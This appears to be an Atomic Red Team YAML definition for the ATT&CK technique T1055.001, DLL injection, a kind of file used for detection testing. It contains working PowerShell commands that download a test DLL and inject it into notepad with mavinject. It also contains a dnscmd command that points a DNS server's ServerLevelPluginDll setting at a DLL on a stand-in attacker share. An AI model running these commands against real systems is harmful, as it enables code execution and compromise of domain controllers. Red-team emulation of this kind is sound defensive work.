attack_technique: T1055.001
display_name: 'Process Injection: Dynamic-link Library Injection'
atomic_tests:
- name: Process Injection via mavinject.exe
  auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
  description: |
    Windows 10 Utility To Inject DLLS.

    Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
    With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
  supported_platforms:
  - windows
  input_arguments:
    process_id:
      description: PID of input_arguments
      type: Integer
      default: (Start-Process notepad -PassThru).id
    dll_payload:
      description: DLL to Inject
      type: Path
      default: PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Utility to inject must exist on disk at specified location (#{dll_payload})
    prereq_command: |
      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "#{dll_payload}"
  executor:
    command: |
      $mypid = #{process_id}
      mavinject $mypid /INJECTRUNNING #{dll_payload}
    name: powershell
    elevation_required: true
- name: DnsAdmins exploitation (DnsCmd)
  auto_generated_guid: 3a3e2dfe-9122-4370-8f61-44e1f26c1f7b
  description: |
    This module runs the Microsoft tool DnsCmd in order to install a malicious DLL onto a DNS server (this service is usually carried by a Domain Controller).
    DnsCmd is available either with the Remote Server Administration Tools (https://www.microsoft.com/en-US/download/details.aspx?id=45520) or in "Features on Demand" since Windows 10.
    Computer must be domain-joined and running with an account that is a member of some specific group (DnsAdmins is expected for the exact exploitation, but this can also work as a Domain Admins).
    Remark: there is no need for a proper DLL path for triggering the detection. I.e. the registry of the remote server (`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`) will be updated with this path, whether or not it is valid. But for real exploitation, the DLL has to follow some conditions and the network path needs to be reachable.
  supported_platforms:
  - windows
  input_arguments:
    target_dns:
      description: DNS server to target
      type: string
      default: DNS.DOMAIN.CORP
    dll_path:
      description: Path to the DLL that the DNS server will attempt to load
      type: string
      default: \\AttackWks\share\attack.dll
  dependency_executor_name: powershell
  dependencies:
  - description: |
      DnsCmd binary must be installed and present on disk.
      The computer must be domain-joined and the authenticated user must be part of the DnsAdmins or Domain Admins group (implicit authentication).
    prereq_command: |
      if (Test-Path "C:\Windows\System32\dnscmd.exe") {
        Write-Host "OK: DnsCmd executable was found"
      } else {
        Write-Host "NOK: DnsCmd executable was not found"
        exit 1
      }

      if ((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {
        Write-Host "OK: the computer is joined to a domain"
      } else {
        Write-Host "NOK: the computer is not joined to a domain"
        exit 1
      }

      # If everything goes well
      exit 0
    get_prereq_command: |
      Write-Host "1. This computer must be manually joined to a domain"
      Write-Host "2. The binary of DnsCmd must be present on the system (through RSAT or Features on Demand)"
  executor:
    name: powershell
    elevation_required: false
    command: |
      dnscmd.exe "#{target_dns}" /config /ServerLevelPluginDll "#{dll_path}"
      
      # Let some time for the attack to generate the required Windows events
      Start-Sleep -Seconds 10
      
      # Enable Remote Registry
      Set-Service -ComputerName "#{target_dns}" -Name RemoteRegistry -Status Running

      # Remove the newly created registry key (otherwise the DNS will be broken at next reboot)
      $registryHive = Invoke-Expression '[Microsoft.Win32.RegistryHive]::LocalMachine' -ErrorAction Stop
      $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($registryHive, '#{target_dns}')
      $regValue = 'ServerLevelPluginDll'
      # Path before the patch (the DC is vulnerable)
      $key = $reg.OpenSubKey('SYSTEM\CurrentControlSet\Services\DNS\Parameters', $true)
      if (($key -ne $null) -and ($key.GetValueNames() -contains $regValue)) {
        $key.DeleteValue($regValue)
      }
      # Path after the patch (when the DC is not vulnerable anymore)
      $key2 = $reg.OpenSubKey('SYSTEM\CurrentControlSet\Services\DNS\InternalParameters', $true)
      if (($key2 -ne $null) -and ($key2.GetValueNames() -contains $regValue)) {
          $key2.DeleteValue($regValue)
      }
